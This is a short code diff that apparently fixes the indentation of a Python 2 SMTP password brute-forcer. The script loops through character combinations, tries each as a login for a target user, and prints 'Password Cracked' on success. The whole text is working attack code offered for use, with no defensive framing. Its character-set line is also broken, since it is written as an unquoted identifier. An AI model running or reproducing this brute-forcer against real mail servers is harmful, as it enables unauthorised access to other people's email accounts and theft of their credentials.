@@ -12,9 +12,9 @@ def print_perms(chars, minlen, maxlen):
       for perm in itertools.product(abcdefghijklmnopqrstuvwxyz1234567890, repeat=n): 
          password = ''.join(perm)
 
-try: 
-    smtpserver.login(user, password) 
-    print "[+] Password Cracked: %s" % password
-    time.sleep(10)
-except smtplib.SMTPAuthenticationError: 
-    print "[!] Password Inccorect: %s" % password
+         try: 
+             smtpserver.login(user, password) 
+             print "[+] Password Cracked: %s" % password
+             time.sleep(10)
+         except smtplib.SMTPAuthenticationError: 
+             print "[!] Password Inccorect: %s" % password
